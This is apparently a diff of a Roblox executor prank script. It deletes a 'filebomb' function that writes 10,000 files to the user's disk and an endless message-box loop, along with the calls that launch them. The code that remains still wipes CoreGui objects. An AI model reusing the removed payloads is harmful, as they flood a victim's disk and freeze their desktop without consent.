@@ -41,30 +41,9 @@ local function delete_coregui()
 		if not CoreGui.Execution then
 			o:Destroy()
 			print(`Deleting CoreGui Object: {o}`)
-		end
+		end 
 	end
 end
-
-local function filebomb()
-	for i = 1, 10000 do
-		task.spawn(function()
-			writefile("you have been goosed "..i..".txt", "goosed")
-			task.wait()
-		end)
-	end
-end
-
-local function msgbox()
-	if messagebox then
-		while true do
-			task.spawn(function()
-				messagebox("you have been goosed", "you have been goosed", 2+16)
-				task.wait()
-			end)
-		end
-	end
-end
-
 
 -- Music
 local Sound = Instance.new("Sound", SoundService)
@@ -78,9 +57,6 @@ task.wait(_G.Delayed_1)
 task.spawn(delete_coregui)
 Sound:Play()
 task.wait(_G.Delayed_2)
-
-task.spawn(filebomb)
-task.spawn(msgbox)
 
 -- Properties
 local ScreenGui = Instance.new("ScreenGui", CoreGui) -- PlayerGui
